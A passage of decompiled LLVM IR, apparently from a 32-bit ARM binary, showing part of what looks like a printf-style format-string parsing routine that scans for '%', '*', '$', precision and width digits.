  %v2_138a4 = inttoptr i32 %v1_138a4 to i32*
  %v3_138a4 = load i32, i32* %v2_138a4, align 4
  store i32 %v3_138a4, i32* %fp.global-to-local, align 4
  br i1 %v2_1387c, label %.dec_label_pc_138f8_crit_edge, label %dec_label_pc_138b0

.dec_label_pc_138f8_crit_edge:                    ; preds = %dec_label_pc_13870
  %v2_138a8 = inttoptr i32 %v0_13874 to i32*
  %v3_138a8 = load i32, i32* %v2_138a8, align 4
  store i32 %v3_138a8, i32* %r0.global-to-local, align 4
  %.pre = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_138f8

dec_label_pc_138b0:                               ; preds = %dec_label_pc_13870
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_138c0 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_138b4

dec_label_pc_138b4:                               ; preds = %dec_label_pc_138e4.dec_label_pc_138b4_crit_edge, %dec_label_pc_138b0
  %v1_138c4 = phi i32 [ %v1_138d4, %dec_label_pc_138e4.dec_label_pc_138b4_crit_edge ], [ 0, %dec_label_pc_138b0 ]
  %v0_138b4 = phi i32 [ %v0_138b4.pre, %dec_label_pc_138e4.dec_label_pc_138b4_crit_edge ], [ %v0_13874, %dec_label_pc_138b0 ]
  %v1_138b4 = inttoptr i32 %v0_138b4 to i32*
  %v2_138b4 = load i32, i32* %v1_138b4, align 4
  %v4_138b8 = mul i32 %v1_138c4, 4
  %v5_138b8 = add i32 %v2_138b4, %v4_138b8
  store i32 %v5_138b8, i32* %r3.global-to-local, align 4
  %v1_138bc = add i32 %v5_138b8, -4
  %v2_138bc = inttoptr i32 %v1_138bc to i8*
  %v3_138bc = load i8, i8* %v2_138bc, align 1
  %v4_138bc = zext i8 %v3_138bc to i32
  store i32 %v4_138bc, i32* %r1.global-to-local, align 4
  store i32 %v2_138c0, i32* @ip, align 4
  %v2_138c4 = add i32 %v1_138c4, %v2_138c0
  store i32 %v2_138c4, i32* %r2.global-to-local, align 4
  %v3_138c8 = add i32 %v2_138c4, -72
  %v4_138c8 = inttoptr i32 %v3_138c8 to i8*
  store i8 %v3_138bc, i8* %v4_138c8, align 1
  %v0_138cc = load i32, i32* %r3.global-to-local, align 4
  %v1_138cc = add i32 %v0_138cc, -4
  %v2_138cc = inttoptr i32 %v1_138cc to i32*
  %v3_138cc = load i32, i32* %v2_138cc, align 4
  store i32 %v3_138cc, i32* %r3.global-to-local, align 4
  %v0_138d0 = load i32, i32* %r1.global-to-local, align 4
  %v9_138d0 = icmp eq i32 %v0_138d0, %v3_138cc
  %v0_138d4 = load i32, i32* %r0.global-to-local, align 4
  %v1_138d4 = add i32 %v0_138d4, 1
  store i32 %v1_138d4, i32* %r0.global-to-local, align 4
  br i1 %v9_138d0, label %dec_label_pc_138dc, label %dec_label_pc_13da0

dec_label_pc_138dc:                               ; preds = %dec_label_pc_138b4
  %v2_138dc = icmp eq i32 %v3_138cc, 0
  br i1 %v2_138dc, label %dec_label_pc_138ec, label %dec_label_pc_138e4

dec_label_pc_138e4:                               ; preds = %dec_label_pc_138dc
  %tmp180 = icmp ult i32 %v1_138d4, 32
  br i1 %tmp180, label %dec_label_pc_138e4.dec_label_pc_138b4_crit_edge, label %dec_label_pc_138ec

dec_label_pc_138e4.dec_label_pc_138b4_crit_edge:  ; preds = %dec_label_pc_138e4
  %v0_138b4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_138b4

dec_label_pc_138ec:                               ; preds = %dec_label_pc_138e4, %dec_label_pc_138dc
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_138f4 = ptrtoint i32* %stack_var_-111 to i32
  store i32 %v2_138f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_138f8

dec_label_pc_138f8:                               ; preds = %.dec_label_pc_138f8_crit_edge, %dec_label_pc_138ec
  %v3_1392c.pre-phi = phi i32 [ %.pre, %.dec_label_pc_138f8_crit_edge ], [ %v2_138c0, %dec_label_pc_138ec ]
  %v0_1392462 = phi i32 [ %v3_138a8, %.dec_label_pc_138f8_crit_edge ], [ %v2_138f4, %dec_label_pc_138ec ]
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 1524, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_22cc0.723 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 -4, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_22cc0.723, i32 0, i32 0), i8** %stack_var_-120, align 4
  br label %dec_label_pc_13924

dec_label_pc_13920:                               ; preds = %.thread19, %dec_label_pc_13a54
  %v0_13920 = phi i32 [ %v2_13acc, %.thread19 ], [ %v0_13a3074, %dec_label_pc_13a54 ]
  %stack_var_-44.0 = phi i32 [ %stack_var_-44.3, %.thread19 ], [ %stack_var_-44.2, %dec_label_pc_13a54 ]
  store i32 %v0_13920, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13924

dec_label_pc_13924:                               ; preds = %dec_label_pc_138f8, %dec_label_pc_13920
  %v1_13938 = phi i32 [ %v0_1392462, %dec_label_pc_138f8 ], [ %v0_13920, %dec_label_pc_13920 ]
  %stack_var_-44.1 = phi i32 [ %tmp115, %dec_label_pc_138f8 ], [ %stack_var_-44.0, %dec_label_pc_13920 ]
  %v1_13924 = inttoptr i32 %v1_13938 to i8*
  %v2_13924 = load i8, i8* %v1_13924, align 1
  %v3_13924 = zext i8 %v2_13924 to i32
  store i32 %v3_13924, i32* %r3.global-to-local, align 4
  %v7_13928 = icmp eq i8 %v2_13924, 42
  br i1 %v7_13928, label %bb, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_13924
  store i32 %v1_13938, i32* %r6.global-to-local, align 4
  %v0_1393c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1393c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13984.preheader

bb:                                               ; preds = %dec_label_pc_13924
  %v1_13930 = load i32, i32* %r8.global-to-local, align 4
  %v2_13930 = load i32, i32* %sb.global-to-local, align 4
  %v4_13930 = mul i32 %v2_13930, %v1_13930
  %v5_13930 = add i32 %v4_13930, %v3_1392c.pre-phi
  store i32 %v5_13930, i32* %r3.global-to-local, align 4
  %v2_13938 = add i32 %v1_13938, 1
  store i32 %v2_13938, i32* %r6.global-to-local, align 4
  %v0_1393c109 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1393c109, i32* %r1.global-to-local, align 4
  %v3_13940 = add i32 %v5_13930, -40
  %v4_13940 = inttoptr i32 %v3_13940 to i32*
  store i32 %v0_1393c109, i32* %v4_13940, align 4
  %v0_13988.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13984.preheader

dec_label_pc_13984.preheader:                     ; preds = %.thread7, %bb
  %v0_13988.pre = phi i32 [ %v1_13938, %.thread7 ], [ %v0_13988.pre.pre, %bb ]
  %v0_1398c.pre = load i32, i32* @lr, align 4
  %v2_1398c = add i32 %v0_1398c.pre, 1524
  %v3_1398c = inttoptr i32 %v2_1398c to i32*
  br label %dec_label_pc_13984

dec_label_pc_13948:                               ; preds = %dec_label_pc_13984
  store i32 214748363, i32* %r3.global-to-local, align 4
  %v0_1394c = load i32, i32* %r1.global-to-local, align 4
  %v2_1394c = add i32 %v0_1394c, -214748363
  %tmp137 = sub i32 214748362, %v0_1394c
  %v6_1394c = and i32 %tmp137, %v0_1394c
  %v7_1394c = icmp slt i32 %v6_1394c, 0
  %v8_1394c = icmp slt i32 %v2_1394c, 0
  %v9_1394c = icmp eq i32 %v0_1394c, 214748363
  %v3_13950 = xor i1 %v8_1394c, %v7_1394c
  %v4_13950 = or i1 %v9_1394c, %v3_13950
  br i1 %v4_13950, label %dec_label_pc_13968, label %dec_label_pc_13954

dec_label_pc_13954:                               ; preds = %dec_label_pc_13948
  store i32 214748364, i32* %r2.global-to-local, align 4
  %v9_13958 = icmp eq i32 %v0_1394c, 214748364
  br i1 %v9_13958, label %dec_label_pc_13960, label %dec_label_pc_13980

dec_label_pc_13960:                               ; preds = %dec_label_pc_13954
  %v8_13964 = icmp ugt i8 %v2_13988, 55
  br i1 %v8_13964, label %dec_label_pc_13980, label %dec_label_pc_13968

dec_label_pc_13968:                               ; preds = %dec_label_pc_13960, %dec_label_pc_13948
  %v2_1396c = mul i32 %v0_1394c, 10
  %v1_13970 = add i32 %v2_1396c, -48
  store i32 %v1_13970, i32* %r3.global-to-local, align 4
  %v2_13974 = add i32 %v1_13970, %v3_13988
  br label %dec_label_pc_13980

dec_label_pc_13980:                               ; preds = %dec_label_pc_13960, %dec_label_pc_13954, %dec_label_pc_13968
  %storemerge = phi i32 [ %v2_13974, %dec_label_pc_13968 ], [ 2147483647, %dec_label_pc_13954 ], [ 2147483647, %dec_label_pc_13960 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_13980 = add i32 %v0_13a08, 1
  store i32 %v1_13980, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13984

dec_label_pc_13984:                               ; preds = %dec_label_pc_13984.preheader, %dec_label_pc_13980
  %v0_13a08 = phi i32 [ %v0_13988.pre, %dec_label_pc_13984.preheader ], [ %v1_13980, %dec_label_pc_13980 ]
  store i32 1524, i32* %r2.global-to-local, align 4
  %v1_13988 = inttoptr i32 %v0_13a08 to i8*
  %v2_13988 = load i8, i8* %v1_13988, align 1
  %v3_13988 = zext i8 %v2_13988 to i32
  store i32 %v3_13988, i32* @ip, align 4
  %v4_1398c = load i32, i32* %v3_1398c, align 4
  store i32 %v4_1398c, i32* %r3.global-to-local, align 4
  %v2_13990 = mul nuw nsw i32 %v3_13988, 2
  store i32 %v2_13990, i32* %r2.global-to-local, align 4
  %v2_13994 = add i32 %v2_13990, %v4_1398c
  %v3_13994 = inttoptr i32 %v2_13994 to i16*
  %v4_13994 = load i16, i16* %v3_13994, align 2
  %v6_13994 = zext i16 %v4_13994 to i32
  store i32 %v6_13994, i32* %r3.global-to-local, align 4
  %v1_13998 = and i32 %v6_13994, 8
  %v2_13998 = icmp eq i32 %v1_13998, 0
  br i1 %v2_13998, label %dec_label_pc_139a0, label %dec_label_pc_13948

dec_label_pc_139a0:                               ; preds = %dec_label_pc_13984
  %v0_139a0 = load i32, i32* %r0.global-to-local, align 4
  %v1_139a0 = add i32 %v0_139a0, -1
  %v2_139a0 = inttoptr i32 %v1_139a0 to i8*
  %v3_139a0 = load i8, i8* %v2_139a0, align 1
  %v4_139a0 = zext i8 %v3_139a0 to i32
  store i32 %v4_139a0, i32* %r3.global-to-local, align 4
  %v7_139a4 = icmp eq i8 %v3_139a0, 37
  br i1 %v7_139a4, label %dec_label_pc_139ac, label %dec_label_pc_13a6c

dec_label_pc_139ac:                               ; preds = %dec_label_pc_139a0
  %v7_139ac = icmp eq i8 %v2_13988, 36
  %. = zext i1 %v7_139ac to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v0_139b8 = load i32, i32* %r1.global-to-local, align 4
  %tmp141 = icmp slt i32 %v0_139b8, 1
  br i1 %tmp141, label %bb142, label %thread-pre-split

bb142:                                            ; preds = %dec_label_pc_139ac
  store i32 0, i32* %r3.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_139ac, %bb142
  %v0_139c0 = phi i32 [ 0, %bb142 ], [ %., %dec_label_pc_139ac ]
  %v2_139c0 = icmp eq i32 %v0_139c0, 0
  %v0_139f4 = load i32, i32* %fp.global-to-local, align 4
  br i1 %v2_139c0, label %dec_label_pc_139f4, label %dec_label_pc_139c8

dec_label_pc_139c8:                               ; preds = %thread-pre-split
  %v2_139f4 = icmp eq i32 %v0_139f4, 0
  %v1_139cc = add i32 %v0_13a08, 1
  store i32 %v1_139cc, i32* %r0.global-to-local, align 4
  br i1 %v2_139f4, label %dec_label_pc_13da0, label %dec_label_pc_139d4

dec_label_pc_139d4:                               ; preds = %dec_label_pc_139c8
  %v2_139d4 = sub i32 %v0_139b8, %v0_139f4
  %v4_139d4 = xor i32 %v0_139f4, %v0_139b8
  %v5_139d4 = xor i32 %v2_139d4, %v0_139b8
  %v6_139d4 = and i32 %v5_139d4, %v4_139d4
  %v7_139d4 = icmp slt i32 %v6_139d4, 0
  %v8_139d4 = icmp slt i32 %v2_139d4, 0
  %v9_139d4 = icmp eq i32 %v0_139b8, %v0_139f4
  %v3_139d8 = xor i1 %v8_139d4, %v7_139d4
  %v4_139d8 = or i1 %v9_139d4, %v3_139d8
  br i1 %v4_139d8, label %dec_label_pc_139e8, label %bb143

bb143:                                            ; preds = %dec_label_pc_139d4
  store i32 %v0_139b8, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_139e8

dec_label_pc_139e4:                               ; preds = %dec_label_pc_13a08, %dec_label_pc_13a10
  %v0_139e4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_139e4, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_139e8

dec_label_pc_139e8:                               ; preds = %bb143, %dec_label_pc_139d4, %dec_label_pc_139e4
  %v0_139e8 = phi i32 [ %v0_139a0, %dec_label_pc_139e4 ], [ %v1_139cc, %dec_label_pc_139d4 ], [ %v1_139cc, %bb143 ]
  %stack_var_-44.2 = phi i32 [ %stack_var_-44.1, %dec_label_pc_139e4 ], [ %v0_139b8, %dec_label_pc_139d4 ], [ %v0_139b8, %bb143 ]
  store i32 %v0_139e8, i32* %r6.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  %v2_13a24.pre = load i8*, i8** %stack_var_-120, align 4
  %v3_13a24 = ptrtoint i8* %v2_13a24.pre to i32
  br label %dec_label_pc_13a24

dec_label_pc_139f4:                               ; preds = %thread-pre-split
  %tmp144 = icmp slt i32 %v0_139f4, 1
  br i1 %tmp144, label %dec_label_pc_13a08, label %dec_label_pc_139fc

dec_label_pc_139fc:                               ; preds = %dec_label_pc_139f4
  %v7_139fc = icmp eq i8 %v2_13988, 109
  br i1 %v7_139fc, label %dec_label_pc_13a6c, label %dec_label_pc_13da0

dec_label_pc_13a08:                               ; preds = %dec_label_pc_139f4
  %tmp181 = icmp ugt i32 %v0_13a08, %v0_139a0
  br i1 %tmp181, label %dec_label_pc_13a10, label %dec_label_pc_139e4

dec_label_pc_13a10:                               ; preds = %dec_label_pc_13a08
  %v1_13a10 = inttoptr i32 %v0_139a0 to i8*
  %v2_13a10 = load i8, i8* %v1_13a10, align 1
  %v3_13a10 = zext i8 %v2_13a10 to i32
  store i32 %v3_13a10, i32* %r3.global-to-local, align 4
  %v7_13a14 = icmp eq i8 %v2_13a10, 48
  br i1 %v7_13a14, label %dec_label_pc_139e4, label %bb145

bb145:                                            ; preds = %dec_label_pc_13a10
  %v1_13a18 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_13a18, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_13a6c

dec_label_pc_13a24.loopexit:                      ; preds = %dec_label_pc_13a2c
  %v1_13a38 = load i32, i32* @r4, align 4
  %v3_13a38 = or i32 %v1_13a38, %v0_13a4c
  store i32 %v3_13a38, i32* @r4, align 4
  %v2_13a3c = add i32 %v0_13a3074, 1
  store i32 %v2_13a3c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13a24

dec_label_pc_13a24:                               ; preds = %dec_label_pc_13a24.loopexit, %dec_label_pc_139e8
  %v0_13a3074 = phi i32 [ %v2_13a3c, %dec_label_pc_13a24.loopexit ], [ %v0_139e8, %dec_label_pc_139e8 ]
  store i32 %v3_13a24, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_13a30 = inttoptr i32 %v0_13a3074 to i8*
  br label %dec_label_pc_13a2c

dec_label_pc_13a2c:                               ; preds = %dec_label_pc_13a44, %dec_label_pc_13a24
  %v0_13a4c = phi i32 [ %v2_13a4c, %dec_label_pc_13a44 ], [ 1, %dec_label_pc_13a24 ]
  %v0_13a2c = phi i32 [ %v5_13a2c, %dec_label_pc_13a44 ], [ %v3_13a24, %dec_label_pc_13a24 ]
  %v1_13a2c = inttoptr i32 %v0_13a2c to i8*
  %v2_13a2c = load i8, i8* %v1_13a2c, align 1
  %v3_13a2c = zext i8 %v2_13a2c to i32
  store i32 %v3_13a2c, i32* %r2.global-to-local, align 4
  %v5_13a2c = add i32 %v0_13a2c, 1
  store i32 %v5_13a2c, i32* %r0.global-to-local, align 4
  %v2_13a30 = load i8, i8* %v1_13a30, align 1
  %v3_13a30 = zext i8 %v2_13a30 to i32
  store i32 %v3_13a30, i32* %r3.global-to-local, align 4
  %v9_13a34 = icmp eq i8 %v2_13a30, %v2_13a2c
  br i1 %v9_13a34, label %dec_label_pc_13a24.loopexit, label %dec_label_pc_13a44

dec_label_pc_13a44:                               ; preds = %dec_label_pc_13a2c
  %v1_13a44 = inttoptr i32 %v5_13a2c to i8*
  %v2_13a44 = load i8, i8* %v1_13a44, align 1
  %v3_13a44 = zext i8 %v2_13a44 to i32
  store i32 %v3_13a44, i32* %r3.global-to-local, align 4
  %v2_13a48 = icmp eq i8 %v2_13a44, 0
  %v2_13a4c = mul i32 %v0_13a4c, 2
  store i32 %v2_13a4c, i32* %r1.global-to-local, align 4
  br i1 %v2_13a48, label %dec_label_pc_13a54, label %dec_label_pc_13a2c

dec_label_pc_13a54:                               ; preds = %dec_label_pc_13a44
  %v1_13a54 = add i32 %v0_13a3074, -1
  %v2_13a54 = inttoptr i32 %v1_13a54 to i8*
  %v3_13a54 = load i8, i8* %v2_13a54, align 1
  %v7_13a58 = icmp eq i8 %v3_13a54, 37
  %v0_13a5c = load i32, i32* @r4, align 4
  %v1_13a5c = and i32 %v0_13a5c, 10
  store i32 %v1_13a5c, i32* %r3.global-to-local, align 4
  %v4_13a60 = udiv i32 %v1_13a5c, 2
  %v5_13a60 = sub nuw nsw i32 -1, %v4_13a60
  %v6_13a60 = and i32 %v0_13a5c, %v5_13a60
  store i32 %v6_13a60, i32* @r4, align 4
  br i1 %v7_13a58, label %dec_label_pc_13a68, label %dec_label_pc_13920

dec_label_pc_13a68:                               ; preds = %dec_label_pc_13a54
  %v0_13a68 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13a68, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13a6c

dec_label_pc_13a6c:                               ; preds = %bb145, %dec_label_pc_139a0, %dec_label_pc_139fc, %dec_label_pc_13a68
  %v1_13aac = phi i32 [ %v0_13a3074, %dec_label_pc_13a68 ], [ %v0_13a08, %bb145 ], [ %v0_13a08, %dec_label_pc_139fc ], [ %v0_13a08, %dec_label_pc_139a0 ]
  %v0_13aa8 = phi i32 [ %v5_13a2c, %dec_label_pc_13a68 ], [ %v0_139a0, %bb145 ], [ %v0_139a0, %dec_label_pc_139fc ], [ %v0_139a0, %dec_label_pc_139a0 ]
  %stack_var_-44.3 = phi i32 [ %stack_var_-44.2, %dec_label_pc_13a68 ], [ %stack_var_-44.1, %bb145 ], [ %stack_var_-44.1, %dec_label_pc_139fc ], [ %stack_var_-44.1, %dec_label_pc_139a0 ]
  %v1_13a6c = inttoptr i32 %v0_13aa8 to i8*
  %v2_13a6c = load i8, i8* %v1_13a6c, align 1
  %v3_13a6c = zext i8 %v2_13a6c to i32
  store i32 %v3_13a6c, i32* %r3.global-to-local, align 4
  %v7_13a70 = icmp eq i8 %v2_13a6c, 42
  br i1 %v7_13a70, label %dec_label_pc_13a78, label %dec_label_pc_13ab8

dec_label_pc_13a78:                               ; preds = %dec_label_pc_13a6c
  %v0_13a78 = load i32, i32* %fp.global-to-local, align 4
  %v2_13a78 = icmp eq i32 %v0_13a78, 0
  br i1 %v2_13a78, label %dec_label_pc_13aa8, label %dec_label_pc_13a80

dec_label_pc_13a80:                               ; preds = %dec_label_pc_13a78
  %v1_13a80 = inttoptr i32 %v1_13aac to i8*
  %v2_13a80 = load i8, i8* %v1_13a80, align 1
  %v3_13a80 = zext i8 %v2_13a80 to i32
  store i32 %v3_13a80, i32* %r3.global-to-local, align 4
  %v7_13a84 = icmp eq i8 %v2_13a80, 36
  br i1 %v7_13a84, label %dec_label_pc_13a8c, label %dec_label_pc_13da0

dec_label_pc_13a8c:                               ; preds = %dec_label_pc_13a80
  %v0_13a8c = load i32, i32* %r1.global-to-local, align 4
  %tmp146 = icmp slt i32 %v0_13a8c, 1
  br i1 %tmp146, label %dec_label_pc_13da0, label %dec_label_pc_13a94

dec_label_pc_13a94:                               ; preds = %dec_label_pc_13a8c
  %v0_13a98 = load i32, i32* %r8.global-to-local, align 4
  %v1_13a98 = load i32, i32* %sb.global-to-local, align 4
  %v3_13a98 = mul i32 %v1_13a98, %v0_13a98
  %v4_13a98 = add i32 %v3_13a98, %v3_1392c.pre-phi
  store i32 %v4_13a98, i32* %r3.global-to-local, align 4
  %v1_13a9c = add i32 %v1_13aac, 1
  store i32 %v1_13a9c, i32* %r6.global-to-local, align 4
  %v2_13aa0 = add i32 %v4_13a98, -12
  %v3_13aa0 = inttoptr i32 %v2_13aa0 to i32*
  store i32 %v0_13a8c, i32* %v3_13aa0, align 4
  br label %dec_label_pc_13ab4

dec_label_pc_13aa8:                               ; preds = %dec_label_pc_13a78
  %v1_13aa8 = add i32 %v0_13aa8, 1
  store i32 %v1_13aa8, i32* %r3.global-to-local, align 4
  %v9_13aac = icmp eq i32 %v1_13aa8, %v1_13aac
  br i1 %v9_13aac, label %dec_label_pc_13ab4, label %dec_label_pc_13da0

dec_label_pc_13ab4:                               ; preds = %dec_label_pc_13aa8, %dec_label_pc_13a94
  store i32 -2147483648, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13ab8

dec_label_pc_13ab8:                               ; preds = %dec_label_pc_13a6c, %dec_label_pc_13ab4
  %v0_13ab8 = load i32, i32* %r8.global-to-local, align 4
  %v2_13ab8 = icmp eq i32 %v0_13ab8, 0
  br i1 %v2_13ab8, label %dec_label_pc_13ac4, label %dec_label_pc_13ae4.loopexit

dec_label_pc_13ac4:                               ; preds = %dec_label_pc_13ab8
  %v0_13ac4 = load i32, i32* %r6.global-to-local, align 4
  %v1_13ac4 = inttoptr i32 %v0_13ac4 to i8*
  %v2_13ac4 = load i8, i8* %v1_13ac4, align 1
  %v3_13ac4 = zext i8 %v2_13ac4 to i32
  store i32 %v3_13ac4, i32* %r3.global-to-local, align 4
  %v7_13ac8 = icmp eq i8 %v2_13ac4, 46
  br i1 %v7_13ac8, label %.thread19, label %dec_label_pc_13adc

.thread19:                                        ; preds = %dec_label_pc_13ac4
  %v2_13acc = add i32 %v0_13ac4, 1
  store i32 %v2_13acc, i32* %r6.global-to-local, align 4
  %v1_13ad0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_13ad0, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13920

dec_label_pc_13adc:                               ; preds = %dec_label_pc_13ac4
  %v0_13adc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_13adc, i32* %sl.global-to-local, align 4
  store i32 -1, i32* @r5, align 4
  br label %dec_label_pc_13ae4

dec_label_pc_13ae4.loopexit:                      ; preds = %dec_label_pc_13ab8
  %v1_13abc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_13abc, i32* @r5, align 4
  %v0_13af0.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13ae4

dec_label_pc_13ae4:                               ; preds = %dec_label_pc_13ae4.loopexit, %dec_label_pc_13adc
  %v0_13af0.pre = phi i32 [ %v0_13af0.pre.pre, %dec_label_pc_13ae4.loopexit ], [ %v0_13ac4, %dec_label_pc_13adc ]
  store i32 -37856, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_22c44.727 to i32), i32* %r1.global-to-local, align 4
  %v1_13af0 = inttoptr i32 %v0_13af0.pre to i8*
  br label %dec_label_pc_13aec

dec_label_pc_13aec:                               ; preds = %dec_label_pc_13b00, %dec_label_pc_13ae4
  %v0_13b00 = phi i32 [ %v1_13b00, %dec_label_pc_13b00 ], [ ptrtoint ([9 x i8]* @global_var_22c44.727 to i32), %dec_label_pc_13ae4 ]
  %v1_13aec = inttoptr i32 %v0_13b00 to i8*
  %v2_13aec = load i8, i8* %v1_13aec, align 1
  %v3_13aec = zext i8 %v2_13aec to i32
  store i32 %v3_13aec, i32* %r2.global-to-local, align 4
  %v2_13af0 = load i8, i8* %v1_13af0, align 1
  %v3_13af0 = zext i8 %v2_13af0 to i32
  store i32 %v3_13af0, i32* %r3.global-to-local, align 4
  %v9_13af4 = icmp eq i8 %v2_13af0, %v2_13aec
  br i1 %v9_13af4, label %bb147, label %dec_label_pc_13b00

bb147:                                            ; preds = %dec_label_pc_13aec
  %v2_13af8 = add i32 %v0_13af0.pre, 1
  store i32 %v2_13af8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13b0c

dec_label_pc_13b00:                               ; preds = %dec_label_pc_13aec
  %v1_13b00 = add i32 %v0_13b00, 1
  %v2_13b00 = inttoptr i32 %v1_13b00 to i8*
  %v3_13b00 = load i8, i8* %v2_13b00, align 1
  %v4_13b00 = zext i8 %v3_13b00 to i32
  store i32 %v4_13b00, i32* %r3.global-to-local, align 4
  store i32 %v1_13b00, i32* %r1.global-to-local, align 4
  %v2_13b04 = icmp eq i8 %v3_13b00, 0
  br i1 %v2_13b04, label %dec_label_pc_13b0c, label %dec_label_pc_13aec

dec_label_pc_13b0c:                               ; preds = %dec_label_pc_13b00, %bb147
  %v1_13b30 = phi i32 [ %v2_13af8, %bb147 ], [ %v0_13af0.pre, %dec_label_pc_13b00 ]
  %v1_13b2c = phi i32 [ %v0_13b00, %bb147 ], [ %v1_13b00, %dec_label_pc_13b00 ]
  %v2_13b14 = sub i32 %v1_13b2c, ptrtoint ([9 x i8]* @global_var_22c44.727 to i32)
  store i32 %v2_13b14, i32* %r3.global-to-local, align 4
  %v8_13b1c = icmp sgt i32 %v2_13b14, 1
  br i1 %v8_13b1c, label %.thread23, label %dec_label_pc_13b20

dec_label_pc_13b20:                               ; preds = %dec_label_pc_13b0c
  %v1_13b20 = inttoptr i32 %v1_13b30 to i8*
  %v2_13b20 = load i8, i8* %v1_13b20, align 1
  %v3_13b20 = zext i8 %v2_13b20 to i32
  store i32 %v3_13b20, i32* %r2.global-to-local, align 4
  %v1_13b24 = inttoptr i32 %v1_13b2c to i8*
  %v2_13b24 = load i8, i8* %v1_13b24, align 1
  %v3_13b24 = zext i8 %v2_13b24 to i32
  store i32 %v3_13b24, i32* %r3.global-to-local, align 4
  %v9_13b28 = icmp eq i8 %v2_13b20, %v2_13b24
  br i1 %v9_13b28, label %bb148, label %.thread23

bb148:                                            ; preds = %dec_label_pc_13b20
  %v2_13b2c = add i32 %v1_13b2c, 9
  store i32 %v2_13b2c, i32* %r1.global-to-local, align 4
  %v2_13b30 = add i32 %v1_13b30, 1
  store i32 %v2_13b30, i32* %r6.global-to-local, align 4
  br label %.thread23

.thread23:                                        ; preds = %dec_label_pc_13b20, %dec_label_pc_13b0c, %bb148
  %v0_13b38 = phi i32 [ %v1_13b2c, %dec_label_pc_13b20 ], [ %v1_13b2c, %dec_label_pc_13b0c ], [ %v2_13b2c, %bb148 ]
  %v0_13b34 = phi i32 [ %v1_13b30, %dec_label_pc_13b20 ], [ %v1_13b30, %dec_label_pc_13b0c ], [ %v2_13b30, %bb148 ]
  %v1_13b34 = inttoptr i32 %v0_13b34 to i8*
  %v2_13b34 = load i8, i8* %v1_13b34, align 1
  %v3_13b34 = zext i8 %v2_13b34 to i32
  store i32 %v3_13b34, i32* %r2.global-to-local, align 4
  %v1_13b38 = add i32 %v0_13b38, 9
  %v2_13b38 = inttoptr i32 %v1_13b38 to i8*
  %v3_13b38 = load i8, i8* %v2_13b38, align 1
  %v4_13b38 = zext i8 %v3_13b38 to i32
  store i32 %v4_13b38, i32* %r3.global-to-local, align 4
  %v2_13b3c = icmp eq i8 %v2_13b34, 0
  %v3_13b40 = mul nuw nsw i32 %v4_13b38, 256
  store i32 %v3_13b40, i32* @ip, align 4
  br i1 %v2_13b3c, label %dec_label_pc_13da0, label %dec_label_pc_13b48

dec_label_pc_13b48:                               ; preds = %.thread23
  store i32 -37756, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_22ca8.729 to i32), i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13b50

dec_label_pc_13b50:                               ; preds = %dec_label_pc_13bd4, %dec_label_pc_13b48
  %v1_13b64 = phi i32 [ %v1_13bd4, %dec_label_pc_13bd4 ], [ ptrtoint ([21 x i8]* @global_var_22ca8.729 to i32), %dec_label_pc_13b48 ]
  %v1_13b50 = inttoptr i32 %v1_13b64 to i8*
  %v2_13b50 = load i8, i8* %v1_13b50, align 1
  %v3_13b50 = zext i8 %v2_13b50 to i32
  store i32 %v3_13b50, i32* %r3.global-to-local, align 4
  %v9_13b54 = icmp eq i8 %v2_13b50, %v2_13b34
  br i1 %v9_13b54, label %dec_label_pc_13b5c, label %dec_label_pc_13bd4

dec_label_pc_13b5c:                               ; preds = %dec_label_pc_13b50
  store i32 ptrtoint ([21 x i8]* @global_var_22ca8.729 to i32), i32* %r3.global-to-local, align 4
  %v2_13b64 = sub i32 %v1_13b64, ptrtoint ([21 x i8]* @global_var_22ca8.729 to i32)
  store i32 %v2_13b64, i32* %r1.global-to-local, align 4
  %v7_13b6c = icmp slt i32 %v2_13b64, 18
  br i1 %v7_13b6c, label %bb150, label %dec_label_pc_13b70

dec_label_pc_13b70:                               ; preds = %dec_label_pc_13b5c
  %v1_13b70 = and i32 %v3_13b40, 1024
  %v2_13b70 = icmp eq i32 %v1_13b70, 0
